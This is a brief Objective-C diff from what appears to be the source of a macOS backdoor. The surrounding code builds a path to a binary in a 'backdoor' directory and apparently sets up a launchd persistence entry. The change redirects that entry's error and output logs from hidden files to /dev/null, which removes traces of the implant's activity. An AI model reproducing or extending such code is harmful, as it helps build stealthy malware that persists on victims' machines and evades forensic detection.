@@ -321,8 +321,8 @@ static __m_MUtils *sharedUtils = nil;
   }
   
   NSString *backdoorPath = [NSString stringWithFormat: @"%@/%@", mBackdoorPath, aBinary];
-  NSString *errorLog = [NSString stringWithFormat: @"%@/ji33", mBackdoorPath];
-  NSString *outLog   = [NSString stringWithFormat: @"%@/ji34", mBackdoorPath];
+  NSString *errorLog = [NSString stringWithFormat: @"/dev/null"];
+  NSString *outLog   = [NSString stringWithFormat: @"/dev/null"];
   
   innerDict = [[NSDictionary alloc] initWithObjectsAndKeys:
                aLabel, @"Label",
